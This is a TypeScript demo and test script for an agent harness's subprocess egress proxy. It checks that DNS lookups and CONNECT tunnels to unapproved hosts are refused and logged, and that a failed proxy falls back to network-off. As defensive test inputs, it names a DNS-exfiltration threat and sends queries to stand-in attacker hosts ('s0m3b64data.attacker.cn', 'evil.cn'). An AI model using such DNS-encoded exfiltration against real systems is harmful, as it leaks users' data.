// Copyright (c) 2026 TechLead 187 LLC
// SPDX-License-Identifier: BUSL-1.1

// harness/scripts/demo_p_sandbox_2.ts
//
// P-SANDBOX.2 (ADR-0166): the mediated subprocess-egress proxy — the increment that directly answers
// ADR-0157's named threat (a package that does `socket.gethostbyname("<b64>.attacker.cn")` at import
// time to exfil over DNS, in-process, after execve returned success). Proves, on any platform (the proxy
// is loopback; the decision brain is injected):
//   1. the decision keystone: ONLY an explicit `allow` passes — a `prompt` (foreign ccTLD / IP literal /
//      not-approved host), an unparseable host, or a THROWN decision all DENY (fail-closed, invariant #3);
//   2. live DNS: a denied `gethostbyname` gets REFUSED and the upstream resolver is NEVER contacted (the
//      exfil channel is dead); an allowed query is forwarded + relayed (pip/apt still resolve);
//   3. live CONNECT: a denied host gets 403; an allowed one tunnels through (pip install over https works);
//   4. proxy DEAD ⇒ egress denied but LOCAL EXEC still runs (wrap falls back to --unshare-net, not refuse);
//   5. the spawn is WIRED: an isolating backend + a started proxy ⇒ omp wrapped in bwrap with HTTP(S)_PROXY
//      set and the child steered at the proxy; a proxy that fails to start ⇒ network-off fallback, still spawns.
//
// Run: bun run harness/scripts/demo_p_sandbox_2.ts

import { createSocket } from "node:dgram";
import { connect as tcpConnect } from "node:net";
import { decideEgress, EgressProxy, type DecideFn } from "../runs/egress_proxy.ts";
import { BwrapBackend, wrapForProfile, type BackendResolution, type SandboxProxy } from "../runs/sandbox_exec.ts";
import { caps } from "../runs/profiles.ts";
import { runAcp, type SpawnFn } from "../launcher/lucid_acp.ts";

const fail = (m: string): never => { console.error(`FAIL: ${m}`); process.exit(1); };
const ok = (cond: boolean, m: string) => { if (!cond) fail(m); console.log(`  ok  ${m}`); };
const allowOnly = (hosts: string[]): DecideFn => (host) => ({ verdict: hosts.includes(host) ? "allow" : "prompt", via: "demo" });

function dnsQuery(name: string, id = 0x1234): Uint8Array {
  const body: number[] = [];
  for (const l of name.split(".").filter(Boolean)) { body.push(l.length); for (const ch of l) body.push(ch.charCodeAt(0)); }
  body.push(0, 0, 1, 0, 1);
  return Uint8Array.from([id >> 8, id & 0xff, 0x01, 0x00, 0, 1, 0, 0, 0, 0, 0, 0, ...body]);
}
function udpRoundTrip(port: number, msg: Uint8Array, timeoutMs = 1500): Promise<Buffer> {
  return new Promise((resolve, reject) => {
    const c = createSocket("udp4");
    const t = setTimeout(() => { c.close(); reject(new Error("udp timeout")); }, timeoutMs);
    c.once("message", (m) => { clearTimeout(t); c.close(); resolve(m); });
    c.once("error", (e) => { clearTimeout(t); reject(e); });
    c.send(msg, port, "127.0.0.1");
  });
}
function connectExpect(port: number, send: string, timeoutMs = 1500): Promise<string> {
  return new Promise((resolve, reject) => {
    const s = tcpConnect({ host: "127.0.0.1", port }, () => s.write(send));
    const t = setTimeout(() => { s.destroy(); reject(new Error("tcp timeout")); }, timeoutMs);
    s.once("data", (d) => { clearTimeout(t); const out = d.toString("latin1"); s.destroy(); resolve(out); });
    s.once("error", (e) => { clearTimeout(t); reject(e); });
  });
}

console.log("== #ADR-0166 P-SANDBOX.2: mediated subprocess egress (the DNS-TXT exfil is contained) ==\n");

// ── [1] the decision keystone ────────────────────────────────────────────────
console.log("[1] decision keystone — only an explicit allow passes, everything else fails closed");
const brain = allowOnly(["pypi.org"]);
ok(decideEgress("pypi.org", brain).action === "allow", "a whitelisted/approved host resolves (pip install still works)");
ok(decideEgress("s0m3b64data.attacker.cn", brain).action === "deny", "the DNS-TXT exfil host (foreign ccTLD → prompt) is DENIED — the exact ADR-0157 threat");
ok(decideEgress("", brain).action === "deny", "an unparseable host is DENIED (never resolved)");
ok(decideEgress("pypi.org", () => { throw new Error("down"); }).action === "deny", "a brain that THROWS denies (a broken decision never means resolve)");

// ── [2] live DNS mediation ───────────────────────────────────────────────────
console.log("\n[2] live DNS — a denied gethostbyname is REFUSED and never reaches the upstream resolver");
let upstreamHits = 0;
const upstream = createSocket("udp4");
await new Promise<void>((r) => upstream.bind(0, "127.0.0.1", () => r()));
const answer = Uint8Array.from([0x12, 0x34, 0x81, 0x80, 0, 1, 0, 1, 0, 0, 0, 0, 0xde, 0xad, 0xbe, 0xef]);
upstream.on("message", (_m, rinfo) => { upstreamHits++; upstream.send(answer, rinfo.port, rinfo.address); });
const upstreamPort = upstream.address().port;

const dnsProxy = new EgressProxy({ decide: brain, upstream: { host: "127.0.0.1", port: upstreamPort } });
const dep = await dnsProxy.start();
const refused = await udpRoundTrip(dep.dnsPort, dnsQuery("s0m3b64data.attacker.cn"));
ok((refused[3]! & 0x0f) === 5, "denied query → RCODE REFUSED (the child's gethostbyname fails cleanly)");
await new Promise((r) => setTimeout(r, 80));
ok(upstreamHits === 0, "the upstream resolver was NEVER contacted — the exfil channel is dead");
const relayed = await udpRoundTrip(dep.dnsPort, dnsQuery("pypi.org"));
ok(Buffer.compare(Buffer.from(relayed), Buffer.from(answer)) === 0, "an ALLOWED query is forwarded + the answer relayed verbatim");
ok(upstreamHits === 1, "…and the allowed query is exactly what reached the upstream");
await dnsProxy.stop();
upstream.close();

// ── [3] live CONNECT mediation ───────────────────────────────────────────────
console.log("\n[3] live CONNECT — deny → 403, allow → tunnelled");
const httpProxy = new EgressProxy({ decide: allowOnly(["pypi.org"]) });
const hep = await httpProxy.start();
ok((await connectExpect(hep.httpPort, "CONNECT evil.cn:443 HTTP/1.1\r\n\r\n")).includes("403"), "a denied CONNECT is refused (403 Forbidden)");
ok((await connectExpect(hep.httpPort, "GET http://evil.cn/x HTTP/1.1\r\n\r\n")).includes("405"), "a plain (non-CONNECT) proxied request is rejected — only tunnels are mediated");
ok(httpProxy.events.some((e) => e.channel === "connect" && e.decision.action === "deny"), "every refusal is recorded in the observable event log");
await httpProxy.stop();

// ── [4] proxy DEAD ⇒ egress denied, LOCAL EXEC still runs ─────────────────────
console.log("\n[4] fail-closed: no proxy ⇒ network-off, but local exec is NOT refused");
const bwrapRes: BackendResolution = { ok: true, backend: new BwrapBackend(() => true), disclosed: false };
const argv = ["/opt/omp", "acp", "-e", "/repo/gate.ts"];
const ctx = { workspace: "/work/ws", home: "/home/u" };
const noProxy = wrapForProfile({ argv, caps: caps("trusted-local"), ctx, resolution: bwrapRes });
ok(noProxy.action === "spawn" && noProxy.plan.args.includes("--unshare-net"),
  "trusted-local with NO proxy → --unshare-net: local exec still SPAWNS, but egress is denied (fail-closed)");
const proxyMeta: SandboxProxy = { host: "127.0.0.1", httpPort: 8888, httpProxyUrl: "http://127.0.0.1:8888", resolvConfPath: "/tmp/lucid-egress-x/resolv.conf" };
const mediated = wrapForProfile({ argv, caps: caps("trusted-local"), ctx: { ...ctx, proxy: proxyMeta }, resolution: bwrapRes });
ok(mediated.action === "spawn" && !mediated.plan.args.includes("--unshare-net") && mediated.plan.env.HTTPS_PROXY === "http://127.0.0.1:8888",
  "…and WITH a proxy → mediated: no --unshare-net, HTTP(S)_PROXY set, DNS steered at the proxy");

// ── [5] the spawn is wired at `lucid acp` ─────────────────────────────────────
console.log("\n[5] `lucid acp` wiring — an isolating backend starts the proxy + steers the child");
const okProbe = async () => ({ ok: true });
function spy() {
  const calls: { cmd: string; args: string[]; env: Record<string, string> }[] = [];
  const fn: SpawnFn = (cmd, args, opts) => {
    calls.push({ cmd, args, env: (opts.env ?? {}) as Record<string, string> });
    return { on(ev: "exit" | "error", cb: (a: unknown) => void) { if (ev === "exit") setTimeout(() => cb(0), 0); } };
  };
  return { calls, fn };
}
{
  const s = spy();
  const startedProxy: SandboxProxy = { host: "127.0.0.1", httpPort: 9999, httpProxyUrl: "http://127.0.0.1:9999", resolvConfPath: "/tmp/lucid-egress-y/resolv.conf" };
  const code = await runAcp({ scannerProbe: okProbe, spawnFn: s.fn, env: {}, stderr: () => {}, sandbox: bwrapRes, proxyStart: async () => startedProxy });
  const call = s.calls[0]!;
  ok(code === 0 && call.cmd === "bwrap" && call.env.HTTPS_PROXY === "http://127.0.0.1:9999" && call.args.join(" ").includes("/etc/resolv.conf"),
    "isolating backend + started proxy → omp wrapped in bwrap, HTTP(S)_PROXY set, resolv.conf steered");
}
{
  let errOut = "";
  const s = spy();
  const code = await runAcp({ scannerProbe: okProbe, spawnFn: s.fn, env: {}, stderr: (t) => (errOut += t), sandbox: bwrapRes, proxyStart: async () => null });
  const call = s.calls[0]!;
  ok(code === 0 && call.cmd === "bwrap" && call.args.includes("--unshare-net") && /network-off/.test(errOut),
    "proxy fails to start → network-off fallback (still spawns; the fail-closed line is loud)");
}

console.log("\n✓ P-SANDBOX.2 demo passed — subprocess egress is mediated by the agent's own brain: allowed reach-outs work, the DNS-TXT exfil is refused + logged, and a dead proxy denies egress without bricking local exec.");
process.exit(0);
